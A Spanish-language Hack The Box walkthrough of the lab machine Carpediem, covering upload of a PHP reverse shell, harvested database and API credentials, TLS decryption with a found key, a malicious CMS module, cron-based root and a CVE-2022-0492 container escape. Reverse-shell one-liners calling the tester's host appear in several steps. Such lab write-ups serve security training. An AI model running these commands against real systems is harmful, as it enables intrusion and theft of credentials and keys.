---
title: Carpediem
date: 2023-04-12 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: []     # TAG names should always be lowercase
---

```shell
# Nmap 7.93 scan initiated Wed Apr 12 09:18:07 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.167
Nmap scan report for 10.10.11.167
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 962176f72dc5f04ee0a8dfb4d95e4526 (RSA)
|   256 b16de3fada10b97b9e57535c5bb76006 (ECDSA)
|_  256 6a1696d80529d590bf6b2a0932dc364f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Comming Soon
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 12 09:18:20 2023 -- 1 IP address (1 host up) scanned in 13.64 seconds
```
Nos encontramos con una página web donde en primera nos muestra el dominio carpediem.htb, al no encontrar nada útil procedemos a enumerar subdominios.

![imagen1](/assets/images/Carpediem/carpediem1.png)

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/carpediem$ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://carpediem.htb" 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://carpediem.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/04/12 09:30:01 Starting gobuster in VHOST enumeration mode
===============================================================
Found: portal.carpediem.htb (Status: 200) [Size: 31090]
                                                       
===============================================================
2023/04/12 09:30:47 Finished
===============================================================
```
Encontramos una página web sobre venta de motocicletas, podremos encontrar una inyección sql dentro del campo p donde nos muestra el hash que identifica la motocicleta. Esto no nos va a ser útil por lo que procedemos a seguir investigando. Primero interceptamos la petición que se hace al momento de editar el perfil para ver que parámetros se están mandando.

![imagen3](/assets/images/Carpediem/carpediem2.png)

![imagen4](/assets/images/Carpediem/carpediem3.png)

Encontramos que hay un parámetro login igual a 2, podemos intentar ponerlo en 1 para ver que cambia, al hacer el cambio y refrescar la página vemos que no hay cambio por lo que procedemos fuzzear.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/carpediem$ wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u "http://portal.carpediem.htb/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://portal.carpediem.htb/FUZZ
Total requests: 4715

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                 
=====================================================================

000000023:   403        9 L      28 W       285 Ch      ".hta"                                                                                                                  
000000025:   403        9 L      28 W       285 Ch      ".htpasswd"                                                                                                             
000000024:   403        9 L      28 W       285 Ch      ".htaccess"                                                                                                             
000000520:   301        9 L      28 W       328 Ch      "admin"                                                                                                                 
000000729:   301        9 L      28 W       329 Ch      "assets"                                                                                                                
000000931:   301        9 L      28 W       328 Ch      "build"                                                                                                                 
000001101:   301        9 L      28 W       330 Ch      "classes"      
```
Encontramos una ruta admin, podemos intentar acceder a esta. Al parecer tenemos permisos para visualizar la página, tenemos un apartado de subir un reporte, al intentar subir un archivo nos manda una advertencia que aún está en desarrollo esta parte y no nos deja. Procedemos a interceptar la petición con burpsuite y vemos que nos solicita un campo multipart/form-data.
![imagen5](/assets/images/Carpediem/carpediem5.png)

![imagen6](/assets/images/Carpediem/carpediem6.png)

![imagen7](/assets/images/Carpediem/carpediem7.png)

Podremos investigar cómo podríamos introducir ese dato para poder subir el archivo. el introducir un ejemplo de multipart/form-data encontramos lo siguiente.

![imagen8](/assets/images/Carpediem/carpediem8.png)

Ponemos file_upload donde nos solicita y vemos que en la respuesta nos da la ruta donde nos subió el archivo. Podemos ver el contenido de nuestro archivo en la ruta que nos dio.

![imagen9](/assets/images/Carpediem/carpediem9.png)

![imagen10](/assets/images/Carpediem/carpediem10.png)

Procedemos a subir un archivo php para entablarnos una conexión.

![imagen11](/assets/images/Carpediem/carpediem11.png)

![imagen12](/assets/images/Carpediem/carpediem12.png)

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/carpediem$ sudo nc -lnvp 443                                            
[sudo] password for gu3ro: 
Sorry, try again.
[sudo] password for gu3ro: 
listening on [any] 443 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.11.167] 37148
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@3c371615b7aa:/var/www/html/portal/uploads$ whoami
whoami
www-data
www-data@3c371615b7aa:/var/www/html/portal/uploads$ hostname -I
172.17.0.6 
```
Dentro nos encontramos credenciales para mysql, las guardaremos si es que se necesitan.

```shell
class DBConnection{

    private $host = 'mysql';
    private $username = 'portaldb';
    private $password = 'J5tnqsXpyzkK4XNt';
    private $database = 'portal';
```
Igualmente encontramos información sobre trudesk, podríamos investigar cómo realizar peticiones a este servicio.

```shell
www-data@3c371615b7aa:/var/www/html/portal/classes$ cat Trudesk.php 
<?php
class TrudeskConnection{

    private $host = 'trudesk.carpediem.htb';
    private $apikey = 'f8691bd2d8d613ec89337b5cd5a98554f8fffcc4';
    private $username = 'svc-portal-tickets';
    private $password = '';
    private $database = '';
    
}
?>
```
Podemos realizar peticiones para ver si hay tickets disponibles.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/carpediem$ curl -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" http://trudesk.carpediem.htb/api/v1/tickets/1 
{"success":false,"error":"Invalid Ticket"}%  
```
Podremos hacer un script para que nos realice una búsqueda rápida de los tickets disponibles.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/carpediem$ seq 1000 2000 | xargs -P50 -I {} curl -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -s http://trudesk.carpediem.htb/api/v1/tickets/{} | jq | grep "comment"
    "comments": [
        "comment": "<p>Thanks, Jeremy.  I agree.  This is a big problem.</p>\n"
        "action": "ticket:comment:added",
    "comments": [
        "comment": "<p>You&#39;re hopelss, man.  Utterly hopeless.</p>\n<p>I&#39;m closing this ticket.</p>\n"
        "action": "ticket:comment:added",
    "comments": [
        "comment": "<p>Hey Adeanna,<br>I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?</p>\n"
        "comment": "<p>Thanks Robert,<br>Last 4 of employee ID is 9650.</p>\n"
        "comment": "<p>Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62</p>\n<p>Also...let him know that if he wants to use a desktop soft phone that we&#39;ve been testing Zoiper with some of our end users.</p>\n<p>Changing the status of this ticket to pending until he&#39;s been set up and changes his initial credentials.</p>\n"
        "action": "ticket:comment:added",
        "action": "ticket:comment:added",
        "action": "ticket:comment:added",
    "comments": [],
    "comments": [
        "comment": "<p>Please don&#39;t expose that application publically.  I told you I would help when I had time and right now I&#39;m just too busy.<br>Build it out if you&#39;d like, but...just don&#39;t do anything stupid.</p>\n"
        "comment": "<p>Don&#39;t worry. I moved it off of the main server and into a container with SSL encryption.</p>\n"
        "action": "ticket:comment:added",
        "action": "ticket:comment:added",
        "action": "ticket:comment:updated",
```
Nos menciona sobre una aplicación Zoiper y nos da un par de códigos, podemos descargarnos zoiper e intentar conectarnos al servidor de la máquina.

![imagen13](/assets/images/Carpediem/carpediem13.png)

![imagen14](/assets/images/Carpediem/carpediem14.png)

En la llamada se nos dio una contraseña, en la conversación pasada se platicó sobre un nuevo empleado, buscando en los tickets encontramos el siguiente usuario.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/carpediem$ seq 1000 2000 | xargs -P50 -I {} curl -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -s http://trudesk.carpediem.htb/api/v1/tickets/{} | jq | grep -i "new"
    "subject": "New employee on-boarding - Horace Flaccus",
    "issue": "<p>We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.<br />Please create this account at your earliest convenience.<br /><br />Thank you.</p>\n",
```
Se puede concluir que el usuario para la contraseña es hflaccus.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/carpediem$ ssh hflaccus@10.10.11.167
hflaccus@10.10.11.167's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 12 Apr 2023 09:18:18 PM UTC

  System load:              0.1
  Usage of /:               73.6% of 9.46GB
  Memory usage:             36%
  Swap usage:               0%
  Processes:                268
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.167
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:9a6a


10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

hflaccus@carpediem:~$ whoami
hflaccus
```
Al revisar lo puertos abiertos vemos que nos encontramos con el 8002, haciéndole un curl https nos sale esto.

```shell
hflaccus@carpediem:/var$ curl http:s//127.0.0.1:8002 
curl: (3) URL using bad/illegal format or missing URL
hflaccus@carpediem:/var$ curl https://127.0.0.1:8002 
curl: (60) SSL: certificate subject name 'backdrop.carpediem.htb' does not match target host name '127.0.0.1'
```
No hacemos port forwarding y vemos que se trata de un sitio web montado con backdrop cms.

![imagen1](/assets/images/Carpediem/carpediem15.png)

En este punto no encontramos nada interesante, intentamos fuzzear por directorios y se buscó alguna vulnerabilidad pero sin éxito. Se procedió a interceptar el flujo de la máquina víctima con tcpdump.

```shell
hflaccus@carpediem:/tmp/priesc$ tcpdump docker0 -w tcp.pcap -v
```
Con ayuda de wireshark podemos revisar el archivo que nos generó tcpdump.

![imagen16](/assets/images/Carpediem/carpediem16.png)

Podemos ver que tenemos información cifrada por ssl, esto puede ser un problema si no tenemos los certificados correspondientes, pero podemos buscar los archivos dentro de la máquina. Al revisar las peticiones por ssl que tenemos el nombre de la encriptación que se está utilizando, en este caso es `TLS_RSA_WITH_AES_256_CBC_SHA256` buscando sobre esa encriptación menciona que no soporta Perfect Forward Secrecy (PFS), esto nos ayudará para poder descifrar los mensajes antes de que lleguen a su destino.

```shell
hflaccus@carpediem:/$ find \-name *backdrop* 2>/dev/null
./etc/ssl/certs/backdrop.carpediem.htb.key
./etc/ssl/certs/backdrop.carpediem.htb.crt
./usr/share/icons/Humanity/apps/24/xfce4-backdrop.svg
./usr/share/icons/Humanity/apps/48/xfce4-backdrop.svg
./usr/share/icons/Humanity/apps/128/xfce4-backdrop.svg
```
![imagen17](/assets/images/Carpediem/carpediem17.png)

Dentro de edit > preferences > RSA keys importamos nuestro archivo .key que nos encontramos en la máquina víctima y así podemos visualizar las peticiones descifradas. En una petición por post podemos ver que se están mandando credenciales.


![imagen18](/assets/images/Carpediem/carpediem18.png)

![imagen19](/assets/images/Carpediem/carpediem19.png)

No pudimos conectarnos a la máquina con estas credenciales, pero podemos utilizarlas para logearnos en el CMS en el puerto 8002.

![imagen20](/assets/images/Carpediem/carpediem20.png)

Estando dentro podemos crear un nuevo módulo para ingresar un archivo php malicioso y así poder entablarnos una conexión. Para eso descargamos un ejemplo por internet y al ser un archivo zip tenemos que descomprimirlo y crear nuestro nuevo archivo y volver a comprimirlo.

![imagen21](/assets/images/Carpediem/carpediem21.png)

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/carpediem/backdrop$ 7z l l10n_pconfig.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs AMD Ryzen 7 4800H with Radeon Graphics          (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 4287 bytes (5 KiB)

Listing archive: l10n_pconfig.zip

--
Path = l10n_pconfig.zip
Type = zip
Physical Size = 4287

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-04-04 15:48:20 .....          325          215  l10n_pconfig/l10n_pconfig.info
2023-04-03 18:50:24 .....         1409          692  l10n_pconfig/README.md
2023-04-03 18:50:24 .....        11081         2962  l10n_pconfig/l10n_pconfig.module
------------------- ----- ------------ ------------  ------------------------
2023-04-04 15:48:20              12815         3869  3 files
```
Intentamos con otros módulos porque el primero no funcionaba. Al tener ejecución de comandos podremos mandarnos una shell.

![imagen22](/assets/images/Carpediem/carpediem22.png)

Vemos que nos encontramos dentro de otro contenedor.

```shel
www-data@90c7f522b842:/var/www/html/backdrop/modules/url_unpublish$ whoami
whoami
www-data
www-data@90c7f522b842:/var/www/html/backdrop/modules/url_unpublish$ ifconfig
ifconfig
bash: ifconfig: command not found
www-data@90c7f522b842:/var/www/html/backdrop/modules/url_unpublish$ hostname -I
<ww/html/backdrop/modules/url_unpublish$ hostname -I                
172.17.0.2 
```
Dentro pudimos ver que root está ejecutando un arhivo, dentro del archivo encontramos lo siguiente.

```shell
www-data@90c7f522b842:/$ ps -eo command 
COMMAND
/bin/bash /root/docker-entrypoint.sh
/usr/sbin/vsftpd
/bin/sh /usr/bin/mysqld_safe
/usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld
logger -t mysqld -p daemon error
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/cron -P
/bin/bash
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
sh -c bash -c "bash -i &> /dev/tcp/10.10.14.42/443 0>&1"
bash -c bash -i &> /dev/tcp/10.10.14.42/443 0>&1
bash -i
script /dev/null -c bash
sh -c bash
bash
/usr/sbin/CRON -P
/bin/sh -c sleep 45; /bin/bash /opt/heartbeat.sh
sleep 45
ps -eo command
```
```shell
www-data@90c7f522b842:/$ cat /opt/heartbeat.sh
#!/bin/bash
#Run a site availability check every 10 seconds via cron
checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
	exit
fi
status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
grep "Welcome to backdrop.carpediem.htb!" "$status"
if [[ "$?" != 0 ]]; then
	#something went wrong.  restoring from backup.
	cp /root/index.php /var/www/html/backdrop/index.php
fi
```
Pareciera que es un script para montarse el servidor, podemos intentar meter código dentro del archivo index.php para poder mandarnos una conexión.

```shell
www-data@90c7f522b842:/$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.42/443 0>&1' > /dev/shm/shell.sh
www-data@90c7f522b842:/$ chmod +x /dev/shm/shell.sh 
www-data@90c7f522b842:/$ echo 'system("bash /dev/shm/shell.sh");' >> /var/www/html/backdrop/index.php
```
```shell
root@90c7f522b842:/var/www/html/backdrop# whoami
whoami
root
root@90c7f522b842:/var/www/html/backdrop# chmod u+s /bin/bash
chmod u+s /bin/bash
root@90c7f522b842:/var/www/html/backdrop# hostname -I
hostname -I
172.17.0.2 
```
Para la escalada hay una vulnerabilidad docker que podemos abusar de la siguiente manera con ayuda de este [blog](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/). Para mayor comodidad nos encontramos con este [script](https://github.com/chenaotian/CVE-2022-0492) que explota automaticamente la vulnerabilidad, así podemos leer la id_rsa del usuario root y pwnear la máquina.

```shell
root@90c7f522b842:/tmp/privesc# ./exp.sh "cat /root/.ssh/id_rsa"
[-] You donot have CAP_SYS_ADMIN, will try
umount: /tmp/testcgroup: target is busy.
[+] Escape Success with unshare!
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAn4XMDVkBUi5Cch7+bhxOLQzqofUIElWw6wNQ2MNZIi3QTUYE0cSn
rCrrVSGKt1BRWrXlNjanoGJGvfENm02L+Dm9dUPbFaJjcFBG80DjrWsVfkCYSwe3g9KjCk
kqXrHXtapCgERNCga82snoEgYN3z9vmsrw/nd2D6OVsQxkIck7bzC2+p2EinjhaY9BVtO0
UVkcDrMBvRq64JOkHHktYEBF95SDRHav1JW6M/wY6lan18Zfrc2x0c+Ktavpp6KwHVXOcJ
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

